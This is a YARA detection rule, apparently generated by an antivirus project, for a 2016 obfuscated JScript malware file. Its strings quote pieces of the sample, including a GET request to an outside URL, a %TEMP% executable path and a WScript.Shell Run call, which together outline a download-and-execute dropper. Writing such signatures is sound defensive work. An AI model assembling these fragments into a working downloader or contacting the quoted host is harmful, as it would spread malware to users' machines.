rule sig_20160328_7105b95f47bc8bb451a934b83f822580 {
  meta:
    description = "datamaliciousorder - file 20160328_7105b95f47bc8bb451a934b83f822580.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9e0e1db979aa983cbd97e961f68529df80f0ddb9222dd887f2ca96dd0ce15786"

  strings:
    $s1  = "function Sszaqtimd() {return Nbjpz[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"khYJvtWAfSOc.exe\";};" fullword ascii
    $s2  = "Hdsyxw[Dlbxyw](\"GET\", \"http://teknosolar.com/xw3ika\", false);" fullword ascii
    $s3  = "do {WScript[Gcwtzitmad](Hrwzqrigu() * 11)} while (Hdsyxw[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "function Qxtkuydnmn(Qkghczvd, Dkvibg){return Qkghczvd - Dkvibg;};" fullword ascii
    $s5  = "var Nbjpz = function Odzqyydlsd() {return WScript[Wrtdmknghc](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Tsgzd() {return ((Xxfoo == true) && (Xxfoo == Lbtrffa)) ? 1 : Mzbgxxvns;};" fullword ascii
    $s7  = "function Dbwfxxhxa(Ubpgxnobvb){Nbjpz[\"Run\"](Ubpgxnobvb, Mzbgxxvns, Mzbgxxvns);};" fullword ascii
    $s8  = "return Qxtkuydnmn(Dlqnkwrhwj, Pdebp);" fullword ascii
    $s9  = "function Wsoef(){return Wfkqut;};" fullword ascii
    $s10 = "function Oyrssct()" fullword ascii
    $s11 = " while (Zmpdutyz){" fullword ascii
    $s12 = "Xxfoo = true; " fullword ascii
    $s13 = "function Wywzrtqbw(Fxepqfzmkb) {var Uhguwnbhg = (1, 2, 3, 4, 5, Fxepqfzmkb); return Uhguwnbhg;};" fullword ascii
    $s14 = "function Hrwzqrigu(){return 22;};" fullword ascii
    $s15 = "function Xmkdwnmd(){return Wrtdmknghc;};" fullword ascii
    $s16 = "var Xxfoo = false;" fullword ascii
    $s17 = "var Zyfcueda = new this[\"Date\"]();" fullword ascii
    $s18 = "var Smkvnzqsuk = false;" fullword ascii
    $s19 = "Lbtrffa = true; " fullword ascii
    $s20 = "var Lbtrffa = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}